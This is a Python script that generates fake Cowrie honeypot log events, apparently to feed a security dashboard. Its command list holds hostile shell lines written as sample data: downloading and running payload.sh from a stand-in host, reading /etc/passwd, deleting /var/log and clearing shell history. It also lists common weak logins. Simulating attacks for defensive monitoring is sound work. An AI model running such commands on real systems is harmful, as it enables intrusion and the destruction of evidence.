import json
import time
import random
import os
import signal
import sys
from datetime import datetime, timezone

LOG_FILE = "cowrie.json"
RUNNING = True

# We'll use a fixed set of IPs so we can easily map them to locations in the backend
IPS = [
    "192.168.1.33", "192.168.1.76", "192.168.1.235", "192.168.1.44",
    "192.168.1.207", "10.0.0.15", "10.0.0.22", "172.16.0.5", "172.16.0.99",
    "8.8.8.8", "1.1.1.1", "114.114.114.114", "9.9.9.9", "89.248.165.1",
    "45.227.255.10", "185.176.27.22", "193.106.191.1", "104.244.75.1",
    "194.26.29.1", "205.210.31.1" # Mix of local and public-looking IPs
]

USERNAMES = ["root", "admin", "user", "oracle", "pi", "support", "test", "ubuntu"]
PASSWORDS = ["123456", "password", "admin123", "root", "1234", "qwerty", "toor"]
COMMANDS = [
    "uname -a", "ls -la", "cd /tmp", "wget http://malicious.com/payload.sh",
    "curl -O http://malicious.com/payload.sh", "chmod +x payload.sh", "./payload.sh",
    "cat /etc/passwd", "whoami", "id", "rm -rf /var/log", "history -c"
]

def signal_handler(sig, frame):
    global RUNNING
    print("\nStopping real-time simulation...")
    RUNNING = False
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def generate_event():
    event_ids = ["cowrie.session.connect", "cowrie.login.failed", "cowrie.login.success", "cowrie.command.input", "cowrie.session.closed"]
    # Adjust weights to make it realistic: lots of fails, few successes, some commands
    weights = [0.3, 0.45, 0.05, 0.15, 0.05] 
    event_id = random.choices(event_ids, weights=weights, k=1)[0]
    
    src_ip = random.choice(IPS)
    # Use timezone-aware UTC datetime
    timestamp = datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")
    session = f"s{random.randint(10000, 99999)}"
    
    event = {
        "eventid": event_id,
        "src_ip": src_ip,
        "timestamp": timestamp,
        "session": session
    }
    
    if event_id in ["cowrie.login.failed", "cowrie.login.success"]:
        event["username"] = random.choice(USERNAMES)
        event["password"] = random.choice(PASSWORDS)
    elif event_id == "cowrie.command.input":
        event["input"] = random.choice(COMMANDS)
    
    return event

def setup_log():
    if not os.path.exists(LOG_FILE):
        print(f"Creating new {LOG_FILE}...")
        # Pre-seed with some historical events to make the dashboard look populated instantly
        with open(LOG_FILE, 'w', encoding='utf-8') as f:
            for _ in range(50):
                e = generate_event()
                # backdate them randomly
                e["timestamp"] = datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")
                f.write(json.dumps(e) + "\n")

if __name__ == "__main__":
    setup_log()
    print(f"Starting real-time simulation. Appending to {LOG_FILE}...")
    print("Press Ctrl+C to stop.")
    
    try:
        while RUNNING:
            num_events = random.randint(1, 3)
            with open(LOG_FILE, 'a', encoding='utf-8') as f:
                for _ in range(num_events):
                    evt = generate_event()
                    f.write(json.dumps(evt) + "\n")
            
            # Print a quick status ticket to console
            print(f"[{datetime.now().strftime('%H:%M:%S')}] Injected {num_events} new event(s).")
            
            # Sleep a random amount of time between 1 and 4 seconds
            time.sleep(random.uniform(1.0, 4.0))
    except KeyboardInterrupt:
        pass
